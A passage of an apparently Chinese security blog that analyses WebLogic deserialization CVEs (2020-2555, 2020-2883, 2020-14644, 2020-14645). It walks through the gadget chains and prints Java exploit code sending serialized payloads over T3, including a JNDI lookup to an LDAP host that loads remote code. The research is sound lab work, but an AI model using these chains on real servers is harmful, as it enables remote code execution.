<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 构造反射连</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>&#125;&#125;</span><br><span class="line">    );</span><br><span class="line">    ReflectionExtractor[] extractors = &#123;</span><br><span class="line">        extractor1,</span><br><span class="line">        extractor2,</span><br><span class="line">        extractor3,</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// 创建LimitFilter实例</span></span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(extractors);</span><br><span class="line">    <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line">    <span class="comment">// 设置limitFilter的m_comparator属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_comparator</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_comparator&quot;</span>);</span><br><span class="line">    m_comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line">    <span class="comment">// 设置limitFilter的m_oAnchorTop属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_oAnchorTop</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_oAnchorTop&quot;</span>);</span><br><span class="line">    m_oAnchorTop.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">	<span class="comment">// 设置BadAttributeValueExpException的val属性</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(badAttributeValueExpException, limitFilter);</span><br><span class="line">	<span class="comment">// 序列化并发送payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = Serializables.serialize(badAttributeValueExpException);</span><br><span class="line">    T3ProtocolOperation.send(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>这里借一下别人的图，修复的方式特别有趣，把整个把<code>LimitFilter</code>类的<code>toString()</code>方法中的全部extractor去掉了</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143734f9c7c3a6c91d0db4a5.png" alt="image-20210127100406491" style="zoom:67%;" />



<h4 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h4><blockquote>
<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2883">https://github.com/Y4er/CVE-2020-2883</a></p>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2020-2555补丁的绕过，因为<code>LimitFilter</code>被禁了，所以我们需要找其他在内部调用了<code>extract()</code>方法的函数，<code>java.util.PriorityQueue.readObject()</code>就是其中一个，我们跟进<code>heapify()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714375b7d2845c7978cadf80b.png" alt="image-20210127134622640"></p>
<p>递归调用<code>siftDown()</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271438502ed1d21c0123b3c682.png" alt="image-20210127134703950"></p>
<p>如果<code>comparator</code>非空，即如果我们自己定义比较器，就调用<code>siftDownUsingComparator()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714386d889120abe5f2902c96.png" alt="image-20210127134828845"></p>
<p>然后在我们的comparator调用<code>compare()</code>方法时</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127135716314"></p>
<p>在里面也调用了<code>extract()</code>方法，后面就和CVE-2020-2555类似了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127141737892"></p>
<p>exploit核心代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造反射链</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;);</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;);</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>&#125;&#125;);</span><br><span class="line">    ValueExtractor[] valueExtractors = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">        reflectionExtractor1,</span><br><span class="line">        reflectionExtractor2,</span><br><span class="line">        reflectionExtractor3,</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// 创建ChainedExtractor实例</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    ValueExtractor[] valueExtractors1 = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123; reflectionExtractor &#125;;</span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(valueExtractors1);</span><br><span class="line">    <span class="comment">// 创建PriorityQueue，并使用自定义的chainedExtractor</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(chainedExtractor1));</span><br><span class="line">    queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置m_aExtractor属性</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedExtractor.class.getSuperclass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_aExtractor</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;m_aExtractor&quot;</span>);</span><br><span class="line">    m_aExtractor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_aExtractor.set(chainedExtractor1, valueExtractors);</span><br><span class="line">	<span class="comment">// 序列化并发送payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = Serializables.serialize(queue);</span><br><span class="line">    T3ProtocolOperation.send(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>将存在类似上面操作的<code>extract()</code> 方法的<code>MvelExtractor</code>和<code>ReflectionExtractor</code> 两个类加入到了黑名单中</p>
<h4 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h4><blockquote>
<p>Oracle WebLogic Server 12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/potats0/cve_2020_14644">https://github.com/potats0/cve_2020_14644</a></p>
<blockquote>
<p>坑：注意打包成jar的时候把jar文件分开放，不然会有其他jar文件的输出信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021358b9e10947ecdee548a535.png" alt="image-20210129234101716"></p>
<p><strong>漏洞分析</strong></p>
<p>这是一条全新的gadget，漏洞入口点在<code>coherence.jar</code>中的<code>com.tangosol.internal.util.invoke.RemoteConstructor</code>，当反序列化类定义了<code>readResolve()</code>方法时，会在<code>readObject()</code>之后被调用</p>
<p>首先我们得知道，如果变量被<code>transient</code>和<code>static</code>修饰的话是不参与序列化和反序列化的，比如下面的<code>m_serializer</code>和<code>m_loader</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135955524e1a6690fa3d0c29.png" alt="image-20210130120113315"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021359a7b05e8757eadb957aab.png" alt="image-20210130115655500"></p>
<p><code>newInstance()</code>如下<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400756c4a2b55c1afe83845.png" alt="image-20210130115853118"></p>
<p><code>getClassLoader()</code>中因为<code>m_loader</code>为空（原因上面提到），所以调用<code>getContextClassLoader()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400a03df57402b076eb10f3.png" alt="image-20210130115954423"></p>
<p>在<code>realize()</code>方法调用如下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400462dfef75783cc2032c3.png" alt="image-20210130130218731"></p>
<p><code>getDefinition()</code>返回的是我们的<code>m_definition</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a32f3723ecc6d3da1ebd.png" alt="image-20210130125805171"></p>
<p>然后是调用了<code>definition</code>的<code>getRemotableClass()</code>方法，返回的是<code>m_clz</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a6e85ebadc3407627149.png" alt="image-20210130130001177"></p>
<p>但是它也是被<code>transient</code>修饰的，所以返回的也是空</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401d9c44b4992aeefa34844.png" alt="image-20210130130045856"></p>
<p>所以下面我们会调用<code>defineClass()</code>去加载我们的<code>definition</code>，这里就可以自己实例化一个自定义类了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401db235884b695c3092387.png" alt="image-20210130130456664"></p>
<p>相关方法的返回如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> ClassIdentity <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_id;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 包名和方法名用`/`隔开</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.getPackage() + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.getSimpleName();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getPackage</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sPackage;</span><br><span class="line">   &#125;	</span><br><span class="line"><span class="comment">// 方法名和版本号用`$`隔开</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getSimpleName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.getBaseName() + <span class="string">&quot;$&quot;</span> + <span class="built_in">this</span>.getVersion();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getBaseName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sBaseName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sVersion;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在后面还会对包名进行检测</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> ProtectionDomain <span class="title function_">preDefineClass</span><span class="params">(String var1, ProtectionDomain var2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">this</span>.checkName(var1)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(<span class="string">&quot;IllegalName: &quot;</span> + var1);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 != <span class="literal">null</span> &amp;&amp; var1.startsWith(<span class="string">&quot;java.&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Prohibited package name: &quot;</span> + var1.substring(<span class="number">0</span>, var1.lastIndexOf(<span class="number">46</span>)));</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">               var2 = <span class="built_in">this</span>.defaultDomain;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (var1 != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="built_in">this</span>.checkCerts(var1, var2.getCodeSource());</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> var2;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 检查包名</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (var1 != <span class="literal">null</span> &amp;&amp; var1.length() != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> var1.indexOf(<span class="number">47</span>) == -<span class="number">1</span> &amp;&amp; (VM.allowArraySyntax() || var1.charAt(<span class="number">0</span>) != <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>所以exploit可以这么编写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化一个ClassIdentity</span></span><br><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>(test.class);</span><br><span class="line"><span class="comment">// ClassPool是CtClass实例的容器</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// CtClass表示一个class文件，以字节码方式存储</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(test.class.getName());</span><br><span class="line"><span class="comment">// 添加version规范类名</span></span><br><span class="line">ctClass.replaceClassName(test.class.getName(), test.class.getName() + <span class="string">&quot;$&quot;</span> + classIdentity.getVersion());</span><br><span class="line"><span class="comment">// 使用RemoteConstructor类封装</span></span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(<span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, ctClass.toBytecode()), <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>未知</p>
<h4 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h4><blockquote>
<p>Oracle WebLogic Server 12.2.1.4.0</p>
<p>因为此构造链子用到了<code>UniversalExtractor</code>类，而这个类是Weblogic 12.2.1.4.0独有的，所以只能影响这个版本</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p>在<code>weblogic_cmd.jar</code>上修改</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-14645">https://github.com/Y4er/CVE-2020-14645</a></p>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2020-2883的补丁绕过，在CVE-2020-2883把<code>ReflectionExtractor</code>类加入到黑名单，我们可以用<code>UniversalExtractor</code>类去进行构造</p>
<p>依旧是来到之前自定义的比较器，这次我们调用的是<code>UniversalExtractor</code>类的<code>extractor</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021402cab665089beeb289fc12.png" alt="image-20210130141130883"></p>
<p>因为<code>oTarget</code>和<code>targetPrev</code>不相等，所以调用<code>extractComplex()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214038c48020886f649cc2084.png" alt="image-20210130141158447"></p>
<p><code>extractComplex()</code>方法具体调用如下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403f906fc7d8ec46927ab7d.png" alt="image-20210130141530634"></p>
<p>这里我们要令<code>clzParam</code>为空（原因在下），查看<code>getClassArry()</code>方法，只要令传入的<code>m_aoParam</code>为空即可</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403182d049a76551a629993.png" alt="image-20210130143626948"></p>
<p>然后来到<code>getCanonicalName()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407274effe8c9bf6cda9c08.png" alt="image-20210130144532283"></p>
<p>进入<code>getValueExtractorCanonicalName()</code>方法，获取lambda的方法名，再放入到<code>computeValueExtractorCanonicalName()</code>调用，其实就是提取出<code>.getKey().databaseMetaData</code>的后半部分，即最后返回的<code>sCName</code>为<code>databaseMetaData</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140467bd62ac3f4bb46c692c.png" alt="image-20210130144653254"></p>
<p><code>isPropertyExtractor()</code>返回<code>!m_fMethod</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214071b18a1316fc7eab787db.png" alt="image-20210130141922042"></p>
<p>我们看看<code>m_fMethod</code>的定义，因为<code>m_fMethod</code>被<code>transient</code>修饰，所以<code>fProperty</code>只能为true</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140432f8cbc611eb7fd1ca1b.png" alt="image-20210130143857296"></p>
<p>如果<code>fProperty</code>为true，就会去调用<code>ClassHelper.findMethod()</code>方法，其中<code>BEAN_ACCESSOR_PREFIXES</code>如下，所以说我们可以调用到任意的<code>get、is</code>的方法，这里是漏洞利用的关键点，在该测试中，我们调用的关键方法为<code>getDatabaseMetaData()</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405b1f8225d79e1aaa35a03.png" alt="image-20210130142347926"></p>
<p>令<code>cParams</code>为空，即令上面提到的<code>clzParam</code>为空，<code>fExactMatch</code>就会一直为true，如果<code>fExactMatch &amp;&amp; !fStatic</code>为true，就回去调用<code>getMethod()</code>方法，这样就能顺利返回方法调用</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405957f92e7dcdfb9a598ff.png" alt="image-20210130142813607"></p>
<p>之后就是调用<code>getDatabaseMetaData</code>的<code>invoke()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214067dcd1f4de020641c89d1.png" alt="image-20210130145752528"></p>
<p>持续跟进，我们可以看到调用了<code>getDatabaseMetaData</code>的<code>connect()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140620de56c99f0a1bde7e27.png" alt="image-20210130145845091"></p>
<p>在里面我们就会看到<code>lookup()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140786a4ea00a352dc2ca03d.png" alt="image-20210130145911420"></p>
<p>JNDI的地址就是我们的<code>dataSource</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407d547627a020518b77053.png" alt="image-20210130150003790"></p>
<p>所以exploit的编写如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建ExtractorComparator实例</span></span><br><span class="line"><span class="type">UniversalExtractor</span> <span class="variable">extractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UniversalExtractor</span>(<span class="string">&quot;getDatabaseMetaData()&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">ExtractorComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(extractor);</span><br><span class="line"><span class="comment">// 创建JdbcRowSetImpl实例</span></span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">rowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">rowSet.setDataSourceName(<span class="string">&quot;ldap://172.20.0.2:1089/#exp&quot;</span>);</span><br><span class="line"><span class="comment">// 创建PriorityQueue实例，并使用自定义比较器</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] q = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;rowSet, rowSet&#125;;</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, q);</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 序列化并发送payload</span></span><br><span class="line"><span class="type">byte</span>[] payload = Serializables.serialize(queue);</span><br><span class="line">T3ProtocolOperation.send(<span class="string">&quot;172.20.0.2&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>未知</p>
<h3 id="XML反序列化"><a href="#XML反序列化" class="headerlink" title="XML反序列化"></a>XML反序列化</h3><h4 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1、12.2.1.2</p>
</blockquote>
<p><strong>poc</strong></p>
